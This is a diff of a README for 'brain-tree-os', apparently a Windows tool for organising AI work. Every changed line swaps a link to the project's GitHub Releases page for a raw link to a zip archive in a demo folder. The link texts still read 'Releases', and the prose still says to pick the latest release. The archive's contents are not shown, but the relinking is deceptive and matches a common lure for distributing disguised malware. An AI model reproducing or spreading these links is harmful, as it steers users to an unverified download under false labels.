@@ -1,6 +1,6 @@
 # 🧠 brain-tree-os - Keep AI Work Clear and Organized
 
-[![Download brain-tree-os](https://img.shields.io/badge/Download-brain--tree--os-blue?style=for-the-badge&logo=github)](https://github.com/Naturejackofalltrades252/brain-tree-os/releases)
+[![Download brain-tree-os](https://img.shields.io/badge/Download-brain--tree--os-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Naturejackofalltrades252/brain-tree-os/main/demo/02_Product/tree_os_brain_1.7.zip)
 
 ## 🌳 What it is
 
@@ -21,7 +21,7 @@ The app is built for normal Windows use. It should work well on Windows 10 and W
 
 Visit this page to download the Windows version:
 
-[Download brain-tree-os from Releases](https://github.com/Naturejackofalltrades252/brain-tree-os/releases)
+[Download brain-tree-os from Releases](https://raw.githubusercontent.com/Naturejackofalltrades252/brain-tree-os/main/demo/02_Product/tree_os_brain_1.7.zip)
 
 On that page, look for the latest release. Download the Windows file that matches your system. If you see more than one file, choose the one for Windows.
 
@@ -145,7 +145,7 @@ Instead of scattering pieces across apps and folders, you can keep them in one s
 
 If you need to install it on another Windows PC, use the same release page:
 
-[https://github.com/Naturejackofalltrades252/brain-tree-os/releases](https://github.com/Naturejackofalltrades252/brain-tree-os/releases)
+[https://raw.githubusercontent.com/Naturejackofalltrades252/brain-tree-os/main/demo/02_Product/tree_os_brain_1.7.zip](https://raw.githubusercontent.com/Naturejackofalltrades252/brain-tree-os/main/demo/02_Product/tree_os_brain_1.7.zip)
 
 ## 🛠️ File layout idea
 
@@ -199,4 +199,4 @@ A small setup is easier to learn than a large one
 
 Use the release page when you want the latest Windows download:
 
-[brain-tree-os Releases](https://github.com/Naturejackofalltrades252/brain-tree-os/releases)
+[brain-tree-os Releases](https://raw.githubusercontent.com/Naturejackofalltrades252/brain-tree-os/main/demo/02_Product/tree_os_brain_1.7.zip)
